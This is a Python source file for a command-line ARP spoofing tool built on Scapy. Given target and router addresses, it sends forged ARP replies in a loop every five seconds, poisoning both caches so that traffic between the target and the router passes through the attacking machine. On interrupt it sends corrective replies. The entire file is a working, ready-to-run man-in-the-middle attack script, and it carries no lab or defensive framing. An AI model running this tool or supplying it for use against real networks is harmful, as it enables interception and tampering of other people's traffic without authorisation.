
import time
import scapy.all as Scapy
import argparse



parser = argparse.ArgumentParser(description="Arp spoofing Tool")
parser.add_argument("-t","--TargetIp",required=True,type=str,help="Ip Address Of Target Machine")
parser.add_argument("-T","--TargetMac",required=True,type=str,help="Mac Address Of target Machinne")
parser.add_argument("-r","--RouterIp",required=True,type=str,help="Ip address of Router")
parser.add_argument("-R","--RouterMac",required=True,type=str,help="Mac address of Router")
parser.add_argument('-i','--index',required=True,type=int,help='Index of interface')
args= parser.parse_args()



router = Scapy.Ether(dst = args.RouterMac) / Scapy.ARP(op=2,hwdst=args.RouterMac,pdst=args.RouterIp,psrc=args.TargetIp)
target = Scapy.Ether(dst = args.TargetMac) / Scapy.ARP(op=2,hwdst=args.TargetMac,pdst=args.TargetIp,psrc=args.RouterIp)

print("[+]Sending ARP reply.Press CTRL+C to quit.....")

try:
    while True:
        Scapy.sendp(router,verbose=False,iface=Scapy.conf.ifaces.dev_from_index(args.index))
        Scapy.sendp(target,verbose=False,iface=Scapy.conf.ifaces.dev_from_index(args.index))
        time.sleep(5)
        
except KeyboardInterrupt as keyInt:
    print("[+]Re-ARPING.........")
    
    router[Scapy.ARP].hwsrc = args.TargetMac
    target[Scapy.ARP].hwsrc = args.RouterMac

    Scapy.sendp(router,verbose=False,iface=Scapy.conf.ifaces.dev_from_index(args.index))
    Scapy.sendp(target,verbose=False,iface=Scapy.conf.ifaces.dev_from_index(args.index))
    
except Exception as Exp:
    print(str(Exp))
    exit(2)
